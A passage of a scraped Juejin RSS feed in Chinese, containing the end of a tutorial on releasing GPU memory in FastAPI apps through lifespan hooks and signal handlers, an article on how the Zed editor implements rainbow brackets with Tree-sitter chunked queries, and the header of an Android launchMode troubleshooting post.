<p>但如果程序在执行某些阻塞操作（比如 AI 推理），可能来不及处理信号就被强制终止了。</p>
<p>更糟糕的是 <code>kill -9</code>，它发送的是 <code>SIGKILL</code> 信号，根本不给程序任何清理的机会。</p>
<p>小禾的解决方案是：<strong>注册信号处理器</strong>。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">def</span> <span class="hljs-title function_">signal_handler</span>(<span class="hljs-params">signum, frame</span>):
    <span class="hljs-string">"""处理终止信号"""</span>
    logger.info(<span class="hljs-string">f"收到信号 <span class="hljs-subst">{signum}</span>，准备清理..."</span>)

    <span class="hljs-keyword">try</span>:
        model_manager.cleanup()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"清理失败: <span class="hljs-subst">{e}</span>"</span>)

    sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-comment"># 注册信号处理器</span>
signal.signal(signal.SIGINT, signal_handler)   <span class="hljs-comment"># Ctrl+C</span>
signal.signal(signal.SIGTERM, signal_handler)  <span class="hljs-comment"># kill 命令</span>
</code></pre>
<p>这样即使 FastAPI 的 <code>shutdown</code> 事件没触发，信号处理器也能兜底。</p>
<hr/>
<h2 data-id="heading-6">Uvicorn 的优雅关闭配置</h2>
<p>小禾还发现 uvicorn 有个配置项可以控制优雅关闭的超时时间：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># run.py</span>
<span class="hljs-keyword">import</span> uvicorn

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    uvicorn.run(
        <span class="hljs-string">"app.main:app"</span>,
        host=<span class="hljs-string">"0.0.0.0"</span>,
        port=<span class="hljs-number">8000</span>,
        reload=<span class="hljs-literal">False</span>,  <span class="hljs-comment"># 生产环境不要开 reload</span>
        workers=<span class="hljs-number">1</span>,     <span class="hljs-comment"># AI 应用一般单进程</span>
        timeout_graceful_shutdown=<span class="hljs-number">30</span>,  <span class="hljs-comment"># 给 30 秒清理时间</span>
    )
</code></pre>
<p><code>timeout_graceful_shutdown</code> 参数告诉 uvicorn：收到停止信号后，等待最多 30 秒让程序完成清理工作。如果 30 秒内没清理完，才强制终止。</p>
<hr/>
<h2 data-id="heading-7">调试技巧：监控显存使用</h2>
<p>为了方便调试，小禾写了个显存监控函数：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">log_gpu_memory</span>():
    <span class="hljs-string">"""打印当前 GPU 显存使用"""</span>
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        allocated = torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        reserved = torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        logger.info(<span class="hljs-string">f"GPU 显存: 已分配 <span class="hljs-subst">{allocated:<span class="hljs-number">.2</span>f}</span>GB, 已预留 <span class="hljs-subst">{reserved:<span class="hljs-number">.2</span>f}</span>GB"</span>)
</code></pre>
<p>在关键位置调用：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    log_gpu_memory()  <span class="hljs-comment"># 启动前</span>
    model_manager.load_model()
    log_gpu_memory()  <span class="hljs-comment"># 加载后</span>

    <span class="hljs-keyword">yield</span>

    log_gpu_memory()  <span class="hljs-comment"># 清理前</span>
    model_manager.cleanup()
    log_gpu_memory()  <span class="hljs-comment"># 清理后</span>
</code></pre>
<p>输出类似这样：</p>
<pre><code class="hljs language-erlang" lang="erlang">GPU 显存: 已分配 <span class="hljs-number">0.00</span>GB, 已预留 <span class="hljs-number">0.00</span>GB
正在加载模型...
模型加载完成
GPU 显存: 已分配 <span class="hljs-number">9.87</span>GB, 已预留 <span class="hljs-number">10.12</span>GB
...
正在释放模型资源...
模型资源已释放
GPU 显存: 已分配 <span class="hljs-number">0.00</span>GB, 已预留 <span class="hljs-number">0.00</span>GB
</code></pre>
<p>一目了然。</p>
<hr/>
<h2 data-id="heading-8">健康检查端点</h2>
<p>小禾还加了个健康检查端点，方便运维监控：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/health"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">health_check</span>():
    gpu_info = {}
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        gpu_info = {
            <span class="hljs-string">"allocated_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
            <span class="hljs-string">"reserved_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
        }

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"healthy"</span>,
        <span class="hljs-string">"gpu"</span>: gpu_info,
        <span class="hljs-string">"model_loaded"</span>: model_manager.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
    }
</code></pre>
<p>请求 <code>/health</code> 就能看到当前状态：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"healthy"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"gpu"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"allocated_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9.87</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"reserved_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10.12</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"model_loaded"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">生命周期清单</h2>
<p>经过这番折腾，小禾总结了一份清单：</p>





















<table><thead><tr><th>阶段</th><th>动作</th></tr></thead><tbody><tr><td>startup</td><td>加载模型、初始化连接、预热缓存</td></tr><tr><td>运行中</td><td>处理请求、监控资源</td></tr><tr><td>shutdown</td><td>释放模型、关闭连接、清理缓存</td></tr></tbody></table>
<p><strong>关键点</strong>：</p>
<ol>
<li>使用 <code>lifespan</code> 上下文管理器，启动和关闭逻辑配对</li>
<li><code>cleanup()</code> 要彻底：移到 CPU、删引用、gc、empty_cache</li>
<li>注册信号处理器应对异常关闭</li>
<li>设置 <code>timeout_graceful_shutdown</code> 给清理留时间</li>
<li>添加健康检查端点方便监控</li>
</ol>
<hr/>
<h2 data-id="heading-10">小禾的感悟</h2>
<pre><code class="hljs language-bash" lang="bash">显存不会说谎，
不释放就是不释放。

启动时加载，
关闭时释放，
听起来很简单，
做起来全是坑。

del 不等于释放，
Ctrl+C 不等于关闭，
<span class="hljs-built_in">kill</span> -9 更是不讲武德。

lifespan 是救星，
信号处理是兜底，
四步清理要牢记：
移到 CPU、删引用、gc、empty_cache。

GPU 很贵，
显存更贵，
别让它们白白浪费。
</code></pre>
<p>小禾看着 nvidia-smi 显示的 2GB 占用，心情舒畅。</p>
<p>终于可以放心地重启服务了。</p>
<hr/>
<p><strong>下一篇预告：接口报 500 了，日志里却啥都没有</strong></p>
<blockquote>
<p>找了三小时的 bug，原来是异常被吞了。</p>
</blockquote>
<p>敬请期待。</p>
<hr/>
<p><code>#FastAPI</code> <code>#Python</code> <code>#GPU</code> <code>#显存管理</code> <code>#生命周期</code> <code>#AI应用</code></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！]]></title>    <link>https://juejin.cn/post/7581698074362150921</link>    <guid>https://juejin.cn/post/7581698074362150921</guid>    <pubDate>2025-12-10T00:42:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074362150921" data-draft-id="7579892134816464931" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T00:42:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golang学习记"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golang学习记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:42:55.000Z" title="Wed Dec 10 2025 00:42:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    24
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><em>“以前看 Lisp 代码像解摩斯密码，现在？像在看霓虹灯管搭的乐高。”</em><br/>
—— 一位刚从 7 层嵌套回调中逃生的前端工程师</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">🔍 一、什么是「彩虹括号」？—— 给括号穿上彩虹衣</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1df3b09bc5a5458687601771be17d188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=HoHmZN8goXfQgizbbROyRxGkul0%3D" alt="彩虹括号效果示例：每层嵌套一个颜色，一眼定位匹配关系" loading="lazy"/></p>
<p>简单说：<strong>不同嵌套层级的括号，自动用不同颜色高亮</strong>。</p>
<p>比如这段 Rust：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span> = <span class="hljs-title function_ invoke__">foo</span>(<span class="hljs-title function_ invoke__">bar</span>(<span class="hljs-title function_ invoke__">baz</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">qux</span>()), <span class="hljs-number">3</span>);
}
</code></pre>
<p>→ 最外层 <code>{ }</code> 是 <strong>蓝色</strong>，<br/>
→ <code>foo(…)</code> 是 <strong>橙色</strong>，<br/>
→ <code>bar(…)</code> 是 <strong>绿色</strong>，<br/>
→ <code>baz(…)</code> 是 <strong>紫色</strong>……<br/>
<strong>颜色轮换，层级分明</strong>，再也不用靠数括号或靠 IDE 高亮“临时成对”来猜匹配关系！</p>
<blockquote>
<p>💡 小知识：<br/>
此功能被 Zed 用户“蹲守”<strong>超过 3 年</strong> —— 是 Zed 史上请求量最高的功能 😎</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">🛠️ 二、技术挑战：为什么“彩虹括号”没那么容易实现？</h2>
<p>乍一听：不就是给括号染个色？<br/>
但真正落地，要跨过三座大山：</p>





















<table><thead><tr><th>方案</th><th>问题</th></tr></thead><tbody><tr><td><strong>依赖语言服务器（LSP）</strong></td><td>LSP 协议压根没定义“括号配对/嵌套深度”这类信息；且 90% 的语言服务器不提供此能力 → ❌ 不可扩展</td></tr><tr><td><strong>照搬 VS Code 方案</strong></td><td>VS Code 为实现它，<strong>在内存中维护整棵语法树</strong> → 大文件卡顿、内存飙升 → ❌ 不适合 Zed 架构</td></tr><tr><td><strong>Zed 的选择</strong></td><td>✅ 只查询<strong>当前可见区域</strong>的括号；✅ 拆成小“块”（chunks）懒加载；✅ 复用现有 Tree-sitter 查询体系</td></tr></tbody></table>
<blockquote>
<p>📌 关键洞察：<br/>
用户不需要“绝对精确”的全局嵌套深度——<br/>
只要<strong>局部视觉区分清晰</strong>，哪怕深处分界处颜色错一位，<strong>人眼也几乎察觉不到</strong>。<br/>
<strong>“够用就好”的工程哲学，让性能与体验双赢。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🌲 三、核心技术：Tree-sitter + Chunked Query —— 小而美的组合拳</h2>
<p>Zed 早已用 <a href="https://link.juejin.cn?target=https%3A%2F%2Ftree-sitter.github.io%2F" target="_blank" title="https://tree-sitter.github.io/" ref="nofollow noopener noreferrer">Tree-sitter</a> 做语法高亮、大纲生成等。<br/>
而每个语言扩展，都自带一个 <code>brackets.scm</code> 查询文件，比如 Rust 的：</p>
<pre><code class="hljs language-scheme" lang="scheme">("(" @open ")" @close)
("[" @open "]" @close)
("{" @open "}" @close)
("&lt;" @open "&gt;" @close)
;; …省略 closure 和泛型
(("\"" @open "\"" @close) (#set! rainbow.exclude))  ; ← 这行关键！排除字符串引号
</code></pre>
<p>👉 这里 <code>(#set! rainbow.exclude)</code> 就是<strong>告诉彩虹括号：“引号别染色，免得干扰阅读”</strong>。</p>
<h3 data-id="heading-3">🧩 智能分块（Chunking）：性能的秘密武器</h3>
<p>Zed 不再“全文件扫描”，而是：</p>
<ol>
<li>
<p>把缓冲区（buffer）按 <strong>50 行一块</strong> 划分；</p>
</li>
<li>
<p>只对<strong>当前编辑器可见的块</strong>执行 Tree-sitter 括号查询；</p>
</li>
<li>
<p>每块独立计算嵌套深度 → <strong>颜色错位风险被限制在块边界</strong>（50 行 ≈ 屏幕 1~2 屏，几乎无感）；</p>
</li>
<li>
<p>编辑时只更新变动块，滚动时懒加载新块。</p>
</li>
</ol>
<blockquote>
<p>✅ 优点：</p>
<ul>
<li>内存占用低 —— 无需整棵语法树</li>
<li>启动快 —— 滚动到哪算到哪</li>
<li>远程开发友好 —— 和本地一致（靠 buffer 同步）</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-4">⚙️ 四、数据结构设计：极简但高效</h2>
<p>核心新增两个字段，放在 <code>Buffer</code>（Zed 的文档模型）里：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeSitterData</span> {
    chunks: RowChunks,                 <span class="hljs-comment">// 行号分块管理器</span>
    brackets_by_chunks: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">Option</span>&lt;<span class="hljs-type">Vec</span>&lt;BracketMatch&lt;<span class="hljs-type">usize</span>&gt;&gt;&gt;&gt;,
}
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BracketMatch</span>&lt;T&gt; {
    <span class="hljs-keyword">pub</span> open_range: Range&lt;T&gt;,   <span class="hljs-comment">// 左括号位置</span>
    <span class="hljs-keyword">pub</span> close_range: Range&lt;T&gt;,  <span class="hljs-comment">// 右括号位置</span>
    <span class="hljs-keyword">pub</span> color_index: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">usize</span>&gt;, <span class="hljs-comment">// 颜色序号：0=蓝, 1=橙, 2=绿...</span>
}
</code></pre>
<ul>
<li>✅ <strong>数据存在 Buffer，不在 Editor</strong> → 多窗口/分屏共享，不重复计算</li>
<li>✅ <strong>修改时立刻失效，渲染时才重查</strong> → 编辑流畅不卡顿</li>
<li>✅ <strong>复用主题配色</strong> → 7 种“强调色”循环，自动适配深色/浅色主题</li>
</ul>
<hr/>
<h2 data-id="heading-5">🧪 五、测试方法也硬核：可视化断言 + 深度嵌套验证</h2>
<p>Zed 团队用一种“可视化测试标记法”验证彩虹逻辑：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>«<span class="hljs-number">1</span>()<span class="hljs-number">1</span>» «<span class="hljs-number">1</span>{
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">a</span> = one«<span class="hljs-number">2</span>(«<span class="hljs-number">3</span>()<span class="hljs-number">3</span>», «<span class="hljs-number">3</span>{ «<span class="hljs-number">4</span>()<span class="hljs-number">4</span>» }<span class="hljs-number">3</span>», «<span class="hljs-number">3</span>()<span class="hljs-number">3</span>»)<span class="hljs-number">2</span>»;
    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..a «<span class="hljs-number">2</span>{
        <span class="hljs-built_in">println!</span>«<span class="hljs-number">3</span>(<span class="hljs-string">"{i}"</span>)<span class="hljs-number">3</span>»;
    }<span class="hljs-number">2</span>»
}<span class="hljs-number">1</span>»
</code></pre>
<p>→ <code>«n…n»</code> 表示该对括号应被标为第 <code>n</code> 号颜色（1~7 循环）<br/>
→ 测试直接“看图说话”，精准验证嵌套逻辑是否正确！</p>
<hr/>
<h2 data-id="heading-6">🎛️ 六、如何开启？高度可定制！</h2>
<p>默认<strong>关闭</strong>（避免打扰旧用户），手动开启：</p>
<ol>
<li><code>Cmd + ,</code> 打开设置</li>
<li>搜索 <code>Colorize Brackets</code></li>
<li>可：
<ul>
<li>✅ 全局开启 / 按语言单独开（比如只给 Rust、JS 开）</li>
<li>✅ 排除特定括号（如 <code>"</code> <code>'</code>，默认已排除）</li>
<li>✅ 通过主题定制 7 种颜色</li>
</ul>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a294a6dac7e54a2da606ff02390097ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932175&amp;x-signature=KzECz8iTIqYLftn4XceeqwaeY6o%3D" alt="Zed 设置界面：Colorize Brackets 开关与语言粒度控制" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">🔮 未来展望：不止于 <code>()[]{}</code></h2>
<p>Zed 已预留扩展能力：</p>
<ul>
<li>✅ <strong>HTML/JSX 标签配对</strong>（<code>&lt;div&gt;</code> / <code>&lt;/div&gt;</code>）技术上已支持，只需在 <code>brackets.scm</code> 中声明 → 下一版本或由社区贡献！</li>
<li>✅ <strong>更多 Tree-sitter 查询缓存化</strong>（如大纲、inlay hints）—— 借“分块缓存”框架复用</li>
</ul>
<hr/>
<h2 data-id="heading-8">✅ 总结：一次克制而优雅的工程实践</h2>

























<table><thead><tr><th>维度</th><th>Zed 方案亮点</th></tr></thead><tbody><tr><td><strong>性能</strong></td><td>分块懒加载 + Tree-sitter 局部查询 → 大文件不卡</td></tr><tr><td><strong>架构</strong></td><td>复用现有 <code>brackets.scm</code> + Buffer 缓存 → 低侵入</td></tr><tr><td><strong>体验</strong></td><td>颜色轮换 + 排除干扰项 + 主题融合 → 美观不刺眼</td></tr><tr><td><strong>扩展性</strong></td><td>分块框架可复用 → 为未来功能铺路</td></tr></tbody></table>
<blockquote>
<p>🎁 Zed 用 3 年时间，把一个“看似简单”的需求，打磨成<strong>兼顾性能、架构与用户体验的典范</strong>。<br/>
它再次证明：<strong>好工具，不在于堆功能，而在于用对的方法，解决真实的痛。</strong></p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”]]></title>    <link>https://juejin.cn/post/7581678032337485866</link>    <guid>https://juejin.cn/post/7581678032337485866</guid>    <pubDate>2025-12-10T02:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581678032337485866" data-draft-id="7581752508780003371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-10T02:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户4165967369355"/> <meta itemprop="url" content="https://juejin.cn/user/1146150492576877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            踩坑实录：微信小程序返回 App 失败？一次 `launchMode` 导致的 Activity 任务栈“迷航”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1146150492576877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户4165967369355
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:17:44.000Z" title="Wed Dec 10 2025 02:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
